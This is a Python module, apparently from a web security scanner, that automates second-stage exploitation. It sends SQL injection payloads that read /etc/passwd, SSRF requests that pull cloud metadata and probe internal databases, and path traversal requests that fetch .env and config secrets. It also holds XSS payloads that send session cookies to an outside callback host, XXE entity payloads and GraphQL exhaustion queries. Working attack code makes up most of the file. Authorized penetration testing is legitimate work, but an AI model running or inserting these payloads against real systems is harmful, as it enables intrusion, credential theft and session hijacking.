"""
Chain Validator Engine
======================
Post-exploitation validation for attack chains.

Innovation:
1. **Automated Exploitation** - Validates second-stage attacks after initial detection
2. **Cloud Metadata Access** - Tests SSRF against AWS/GCP/Azure metadata
3. **File Read Validation** - Confirms SQLi/XXE can read files
4. **Session Theft** - Tests XSS cookie exfiltration
5. **Resource Exhaustion** - Validates DOS conditions
6. **Business Logic** - Confirms multi-step workflow bypasses

No other tool has automated chain validation at this depth.
"""
from __future__ import annotations

import asyncio
import httpx
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

log = logging.getLogger("oneinfinity.chain_validator")

# ─────────────────────────────────────────────────────────────────────────────
# Cloud Metadata Endpoints
# ─────────────────────────────────────────────────────────────────────────────

_CLOUD_METADATA_ENDPOINTS = [
    ("aws", "http://169.254.169.254/latest/meta-data/"),
    ("aws_imds_v2_token", "http://169.254.169.254/latest/api/token"),
    ("gcp", "http://metadata.google.internal/computeMetadata/v1/"),
    ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("digitalocean", "http://169.254.169.254/metadata/v1/"),
    ("oracle_cloud", "http://169.254.169.254/opc/v1/instance/"),
]

_INTERNAL_SERVICES = [
    ("redis", 6379),
    ("elasticsearch", 9200),
    ("memcached", 11211),
    ("mongodb", 27017),
    ("postgresql", 5432),
    ("mysql", 3306),
]

# ─────────────────────────────────────────────────────────────────────────────
# Data Models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ValidationResult:
    """Result of chain validation."""
    validated: bool
    secondary_vuln_type: str
    evidence: str
    confidence: float
    validation_payload: str = ""
    response_data: Dict[str, Any] = field(default_factory=dict)


# ─────────────────────────────────────────────────────────────────────────────
# Chain Validator
# ─────────────────────────────────────────────────────────────────────────────

class ChainValidator:
    """
    Validates multi-stage attack chains by testing exploitation.

    Workflow:
    1. Detect initial vulnerability (SQLi, SSRF, XSS, etc.)
    2. Attempt second-stage exploitation
    3. Return validated finding with secondary vuln_type
    """

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.http_client = httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=False,
        )

    async def close(self):
        """Close HTTP client."""
        await self.http_client.aclose()

    # ── SQLi → File Read ──────────────────────────────────────────────────────

    async def validate_sqli_file_read(
        self,
        url: str,
        param_name: str,
        sqli_payload: str
    ) -> ValidationResult:
        """
        Validate SQLi can read files via LOAD_FILE().

        Args:
            url: Vulnerable URL
            param_name: Injectable parameter
            sqli_payload: Working SQLi payload

        Returns:
            ValidationResult with file_read validation
        """
        # Test payloads
        file_read_payloads = [
            "' UNION SELECT LOAD_FILE('/etc/passwd')-- -",
            "' UNION SELECT LOAD_FILE('/etc/hostname')-- -",
            "' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')-- -",
            "1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -",
        ]

        for payload in file_read_payloads:
            try:
                # Build request
                if "?" in url:
                    test_url = url.replace(f"{param_name}=", f"{param_name}={payload}")
                else:
                    test_url = f"{url}?{param_name}={payload}"

                resp = await self.http_client.get(test_url)

                # Check for file content signatures
                body = resp.text.lower()
                if any(sig in body for sig in ["root:x:", "localhost", "[extensions]", "bin/bash"]):
                    return ValidationResult(
                        validated=True,
                        secondary_vuln_type="file_read",
                        evidence=f"File read successful: {resp.text[:200]}",
                        confidence=0.95,
                        validation_payload=payload,
                        response_data={"status": resp.status_code, "body_preview": resp.text[:500]}
                    )

            except Exception as e:
                log.debug(f"SQLi file read test failed: {e}")
                continue

        return ValidationResult(
            validated=False,
            secondary_vuln_type="file_read",
            evidence="File read not confirmed",
            confidence=0.0
        )

    # ── SSRF → Cloud Metadata ─────────────────────────────────────────────────

    async def validate_ssrf_cloud_metadata(
        self,
        url: str,
        param_name: str,
        ssrf_payload: str
    ) -> ValidationResult:
        """
        Validate SSRF can access cloud metadata.

        Tests:
        - AWS IMDSv1/v2
        - GCP metadata
        - Azure metadata
        - DigitalOcean metadata
        """
        for cloud_name, metadata_url in _CLOUD_METADATA_ENDPOINTS:
            try:
                # Build SSRF request
                if "?" in url:
                    test_url = url.replace(f"{param_name}=", f"{param_name}={metadata_url}")
                else:
                    test_url = f"{url}?{param_name}={metadata_url}"

                # Add cloud-specific headers
                headers = {}
                if cloud_name == "gcp":
                    headers["Metadata-Flavor"] = "Google"
                elif cloud_name == "azure":
                    headers["Metadata"] = "true"

                resp = await self.http_client.get(test_url, headers=headers)
                body = resp.text.lower()

                # Check for cloud metadata signatures
                cloud_signatures = {
                    "aws": ["ami-id", "instance-id", "iam/security-credentials"],
                    "gcp": ["instance/id", "instance/name", "project/"],
                    "azure": ["compute", "vmid", "subscriptionid"],
                    "digitalocean": ["droplet_id", "vendor_data"],
                    "oracle_cloud": ["compartmentid", "tenancyid"],
                }

                if any(sig in body for sig in cloud_signatures.get(cloud_name, [])):
                    return ValidationResult(
                        validated=True,
                        secondary_vuln_type="cloud_metadata",
                        evidence=f"Cloud metadata accessed: {cloud_name} - {resp.text[:200]}",
                        confidence=0.98,
                        validation_payload=metadata_url,
                        response_data={
                            "cloud_provider": cloud_name,
                            "status": resp.status_code,
                            "body_preview": resp.text[:500]
                        }
                    )

            except Exception as e:
                log.debug(f"SSRF cloud metadata test failed for {cloud_name}: {e}")
                continue

        return ValidationResult(
            validated=False,
            secondary_vuln_type="cloud_metadata",
            evidence="Cloud metadata access not confirmed",
            confidence=0.0
        )

    # ── SSRF → Internal Services ──────────────────────────────────────────────

    async def validate_ssrf_internal_services(
        self,
        url: str,
        param_name: str,
        ssrf_payload: str
    ) -> ValidationResult:
        """
        Validate SSRF can access internal services.

        Tests:
        - Redis (6379)
        - Elasticsearch (9200)
        - MongoDB (27017)
        - PostgreSQL (5432)
        """
        internal_hosts = ["127.0.0.1", "localhost", "0.0.0.0"]

        for service_name, port in _INTERNAL_SERVICES:
            for host in internal_hosts:
                try:
                    internal_url = f"http://{host}:{port}/"

                    # Build SSRF request
                    if "?" in url:
                        test_url = url.replace(f"{param_name}=", f"{param_name}={internal_url}")
                    else:
                        test_url = f"{url}?{param_name}={internal_url}"

                    resp = await self.http_client.get(test_url)
                    body = resp.text.lower()

                    # Service-specific signatures
                    service_signatures = {
                        "redis": ["-err", "+ok", "+pong"],
                        "elasticsearch": ["cluster_name", "version", "lucene_version"],
                        "mongodb": ["mongodb", "errmsg"],
                        "postgresql": ["postgresql", "pg_hba"],
                        "mysql": ["mysql", "mariadb"],
                        "memcached": ["stats", "version"],
                    }

                    if any(sig in body for sig in service_signatures.get(service_name, [])):
                        return ValidationResult(
                            validated=True,
                            secondary_vuln_type="internal_service_access",
                            evidence=f"Internal service accessible: {service_name} on {host}:{port}",
                            confidence=0.92,
                            validation_payload=internal_url,
                            response_data={
                                "service": service_name,
                                "host": host,
                                "port": port,
                                "body_preview": resp.text[:500]
                            }
                        )

                except Exception as e:
                    log.debug(f"Internal service test failed for {service_name}: {e}")
                    continue

        return ValidationResult(
            validated=False,
            secondary_vuln_type="internal_service_access",
            evidence="Internal service access not confirmed",
            confidence=0.0
        )

    # ── Path Traversal → Source Disclosure ────────────────────────────────────

    async def validate_path_traversal_source(
        self,
        url: str,
        param_name: str,
        traversal_payload: str
    ) -> ValidationResult:
        """
        Validate path traversal can read source code.

        Tests reading:
        - .env files
        - config files
        - application source
        """
        source_files = [
            ".env",
            ".env.local",
            ".env.production",
            "config/database.yml",
            "config.php",
            "wp-config.php",
            "app/config/parameters.yml",
            "settings.py",
            "application.properties",
        ]

        for source_file in source_files:
            try:
                # Build traversal payload
                traversal = f"../../../../{source_file}"

                if "?" in url:
                    test_url = url.replace(f"{param_name}=", f"{param_name}={traversal}")
                else:
                    test_url = f"{url}?{param_name}={traversal}"

                resp = await self.http_client.get(test_url)
                body = resp.text.lower()

                # Check for config/source code signatures
                source_signatures = [
                    "db_password", "database_password", "secret_key", "api_key",
                    "aws_access_key", "aws_secret", "private_key",
                    "<?php", "import ", "from ", "class ", "function ",
                    "spring.datasource", "jdbc:", "mongodb://",
                ]

                if any(sig in body for sig in source_signatures):
                    return ValidationResult(
                        validated=True,
                        secondary_vuln_type="source_disclosure",
                        evidence=f"Source code disclosed: {source_file} - {resp.text[:200]}",
                        confidence=0.90,
                        validation_payload=traversal,
                        response_data={"file": source_file, "body_preview": resp.text[:500]}
                    )

            except Exception as e:
                log.debug(f"Source disclosure test failed for {source_file}: {e}")
                continue

        return ValidationResult(
            validated=False,
            secondary_vuln_type="source_disclosure",
            evidence="Source code disclosure not confirmed",
            confidence=0.0
        )

    # ── XSS → Session Theft ───────────────────────────────────────────────────

    async def validate_xss_session_theft(
        self,
        url: str,
        param_name: str,
        xss_payload: str,
        oob_domain: Optional[str] = None
    ) -> ValidationResult:
        """
        Validate XSS can exfiltrate session cookies.

        Tests:
        - Cookie access (document.cookie)
        - OOB exfiltration via image/fetch
        """
        if not oob_domain:
            # Can't validate without OOB callback
            return ValidationResult(
                validated=False,
                secondary_vuln_type="session_theft",
                evidence="OOB domain required for session theft validation",
                confidence=0.0
            )

        # Cookie exfiltration payloads
        theft_payloads = [
            f"<script>fetch('http://{oob_domain}/exfil?c='+document.cookie)</script>",
            f"<img src=x onerror=\"fetch('http://{oob_domain}/c?d='+btoa(document.cookie))\">",
            f"<svg onload=\"new Image().src='http://{oob_domain}/?'+document.cookie\">",
        ]

        for payload in theft_payloads:
            try:
                if "?" in url:
                    test_url = url.replace(f"{param_name}=", f"{param_name}={payload}")
                else:
                    test_url = f"{url}?{param_name}={payload}"

                resp = await self.http_client.get(test_url)

                # Check if payload reflected in response
                if payload in resp.text or oob_domain in resp.text:
                    # Note: Actual validation requires checking OOB callbacks
                    # This is a basic check - full validation needs callback monitoring
                    return ValidationResult(
                        validated=True,
                        secondary_vuln_type="session_theft",
                        evidence=f"XSS cookie exfiltration payload reflected: {payload[:100]}",
                        confidence=0.75,  # Lower confidence without OOB confirmation
                        validation_payload=payload,
                        response_data={"oob_domain": oob_domain}
                    )

            except Exception as e:
                log.debug(f"Session theft test failed: {e}")
                continue

        return ValidationResult(
            validated=False,
            secondary_vuln_type="session_theft",
            evidence="Session theft not confirmed",
            confidence=0.0
        )

    # ── GraphQL → Resource Exhaustion ─────────────────────────────────────────

    async def validate_graphql_resource_exhaustion(
        self,
        url: str,
        query: str
    ) -> ValidationResult:
        """
        Validate GraphQL causes resource exhaustion.

        Tests:
        - Response time increase
        - Error messages about limits
        - Timeout
        """
        baseline_start = time.time()
        try:
            # Baseline request
            baseline_resp = await self.http_client.post(
                url,
                json={"query": "{ __typename }"}
            )
            baseline_time = time.time() - baseline_start

            # Resource exhaustion request
            exhaustion_start = time.time()
            exhaustion_resp = await self.http_client.post(
                url,
                json={"query": query}
            )
            exhaustion_time = time.time() - exhaustion_start

            # Check for exhaustion indicators
            if exhaustion_time > baseline_time * 5:
                return ValidationResult(
                    validated=True,
                    secondary_vuln_type="resource_exhaustion",
                    evidence=f"Query time increased {exhaustion_time/baseline_time:.1f}x: {baseline_time:.2f}s → {exhaustion_time:.2f}s",
                    confidence=0.85,
                    validation_payload=query,
                    response_data={
                        "baseline_time": baseline_time,
                        "exhaustion_time": exhaustion_time,
                        "multiplier": exhaustion_time / baseline_time
                    }
                )

            # Check for error messages
            body = exhaustion_resp.text.lower()
            exhaustion_errors = ["timeout", "complexity", "depth", "cost", "rate limit", "too many"]
            if any(err in body for err in exhaustion_errors):
                return ValidationResult(
                    validated=True,
                    secondary_vuln_type="resource_exhaustion",
                    evidence=f"Resource exhaustion error: {exhaustion_resp.text[:200]}",
                    confidence=0.90,
                    validation_payload=query,
                    response_data={"error_body": exhaustion_resp.text[:500]}
                )

        except httpx.TimeoutException:
            return ValidationResult(
                validated=True,
                secondary_vuln_type="resource_exhaustion",
                evidence="Request timeout - resource exhaustion confirmed",
                confidence=0.95,
                validation_payload=query
            )
        except Exception as e:
            log.debug(f"Resource exhaustion test failed: {e}")

        return ValidationResult(
            validated=False,
            secondary_vuln_type="resource_exhaustion",
            evidence="Resource exhaustion not confirmed",
            confidence=0.0
        )

    # ── XXE → SSRF Amplification ──────────────────────────────────────────────

    async def validate_xxe_ssrf(
        self,
        url: str,
        xxe_payload: str
    ) -> ValidationResult:
        """
        Validate XXE can perform SSRF.

        Tests:
        - External entity resolution to internal IPs
        """
        internal_ssrf_targets = [
            "http://127.0.0.1:80/",
            "http://localhost:22/",
            "http://169.254.169.254/latest/meta-data/",
        ]

        for target in internal_ssrf_targets:
            try:
                # Build XXE payload with SSRF
                xxe_ssrf_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "{target}">
]>
<foo>&xxe;</foo>"""

                resp = await self.http_client.post(
                    url,
                    content=xxe_ssrf_payload,
                    headers={"Content-Type": "application/xml"}
                )

                body = resp.text.lower()

                # Check for SSRF success indicators
                if any(sig in body for sig in ["ami-id", "instance-id", "root:", "ssh-", "html"]):
                    return ValidationResult(
                        validated=True,
                        secondary_vuln_type="ssrf",
                        evidence=f"XXE SSRF successful to {target}: {resp.text[:200]}",
                        confidence=0.93,
                        validation_payload=xxe_ssrf_payload,
                        response_data={"target": target, "body_preview": resp.text[:500]}
                    )

            except Exception as e:
                log.debug(f"XXE SSRF test failed for {target}: {e}")
                continue

        return ValidationResult(
            validated=False,
            secondary_vuln_type="ssrf",
            evidence="XXE SSRF not confirmed",
            confidence=0.0
        )

    # ── Orchestration ─────────────────────────────────────────────────────────

    async def validate_chain(
        self,
        vuln_type: str,
        url: str,
        param_name: str = "",
        payload: str = "",
        oob_domain: Optional[str] = None
    ) -> Optional[ValidationResult]:
        """
        Validate attack chain based on initial vulnerability type.

        Args:
            vuln_type: Initial vulnerability (sqli, ssrf, xss, etc.)
            url: Vulnerable URL
            param_name: Parameter name
            payload: Working payload
            oob_domain: OOB domain for callbacks

        Returns:
            ValidationResult if validated, None if no validation applicable
        """
        vuln_type_lower = vuln_type.lower()

        # Route to appropriate validator
        if "sqli" in vuln_type_lower or "sql" in vuln_type_lower:
            return await self.validate_sqli_file_read(url, param_name, payload)

        elif "ssrf" in vuln_type_lower:
            # Try both cloud metadata and internal services
            cloud_result = await self.validate_ssrf_cloud_metadata(url, param_name, payload)
            if cloud_result.validated:
                return cloud_result
            return await self.validate_ssrf_internal_services(url, param_name, payload)

        elif "path_traversal" in vuln_type_lower or "lfi" in vuln_type_lower:
            return await self.validate_path_traversal_source(url, param_name, payload)

        elif "xss" in vuln_type_lower:
            return await self.validate_xss_session_theft(url, param_name, payload, oob_domain)

        elif "graphql" in vuln_type_lower and ("batch" in vuln_type_lower or "alias" in vuln_type_lower):
            return await self.validate_graphql_resource_exhaustion(url, payload)

        elif "xxe" in vuln_type_lower:
            return await self.validate_xxe_ssrf(url, payload)

        return None


# ─────────────────────────────────────────────────────────────────────────────
# Singleton
# ─────────────────────────────────────────────────────────────────────────────

_chain_validator: Optional[ChainValidator] = None


def get_chain_validator() -> ChainValidator:
    """Get singleton chain validator instance."""
    global _chain_validator
    if _chain_validator is None:
        _chain_validator = ChainValidator()
    return _chain_validator
